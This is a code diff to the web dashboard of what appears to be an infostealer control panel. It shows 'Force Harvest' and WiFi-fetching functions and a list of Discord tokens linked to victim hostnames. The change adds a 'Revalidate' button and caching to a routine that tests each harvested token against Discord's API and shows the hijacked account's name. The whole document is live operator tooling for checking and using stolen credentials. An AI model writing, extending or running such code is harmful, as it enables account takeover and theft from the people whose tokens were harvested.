@@ -280,6 +280,7 @@
       <div class="flex items-center gap-3 mb-5">
         <button class="px-4 py-2 text-sm font-medium text-white bg-violet-600 hover:bg-violet-700 rounded-lg border border-violet-500 transition" id="discordServersBtn" onclick="loadDiscordServers()">List Servers</button>
         <button class="px-4 py-2 text-sm font-medium text-white bg-emerald-600 hover:bg-emerald-700 rounded-lg border border-emerald-500 transition" id="discordForceBtn" onclick="forceDiscordHarvest()">Force Harvest</button>
+        <button class="px-4 py-2 text-sm font-medium text-white bg-amber-600 hover:bg-amber-700 rounded-lg border border-amber-500 transition" id="discordRevalBtn" onclick="g_tokenCache={};fetchDiscordTokens();showToast('Revalidating all tokens','success')">Revalidate</button>
         <span class="text-xs text-slate-500" id="discordStatus">Select a token first</span>
       </div>
       <div class="grid grid-cols-1 lg:grid-cols-3 gap-5">
@@ -967,6 +968,7 @@ async function fetchWiFi() {
 let g_discordToken = '';
 let g_discordGuildId = '';
 let g_discordChannelId = '';
+let g_tokenCache = {};
 
 async function fetchDiscordTokens() {
   try {
@@ -989,15 +991,22 @@ async function fetchDiscordTokens() {
       const host = row.hostname || '-';
       let valid = false;
       let userInfo = '';
+      const cacheKey = row.id;
       if (token) {
-        try {
-          const testRes = await fetch('https://discord.com/api/v9/users/@me', { headers: { 'Authorization': token } });
-          valid = testRes.ok;
-          if (valid) {
-            const user = await testRes.json();
-            userInfo = (user.global_name || user.username || '') + '#' + (user.discriminator !== '0' ? user.discriminator : '');
-          }
-        } catch (_) {}
+        if (g_tokenCache[cacheKey]) {
+          valid = g_tokenCache[cacheKey].valid;
+          userInfo = g_tokenCache[cacheKey].userInfo;
+        } else {
+          try {
+            const testRes = await fetch('https://discord.com/api/v9/users/@me', { headers: { 'Authorization': token } });
+            valid = testRes.ok;
+            if (valid) {
+              const user = await testRes.json();
+              userInfo = (user.global_name || user.username || '') + '#' + (user.discriminator !== '0' ? user.discriminator : '');
+            }
+            g_tokenCache[cacheKey] = { valid, userInfo };
+          } catch (_) {}
+        }
       }
       const statusBadge = valid ? '<span class="text-xs px-1.5 py-0.5 rounded bg-emerald-800/40 text-emerald-300 border border-emerald-700/40 ml-1">' + escapeHtml(userInfo) + '</span>' : '<span class="text-xs px-1.5 py-0.5 rounded bg-rose-800/40 text-rose-300 border border-rose-700/40 ml-1">Invalid</span>';
       const masked = token.length > 20 ? token.substring(0, 10) + '&#8226;'.repeat(20) + token.substring(token.length - 5) : '&#8226;'.repeat(20);
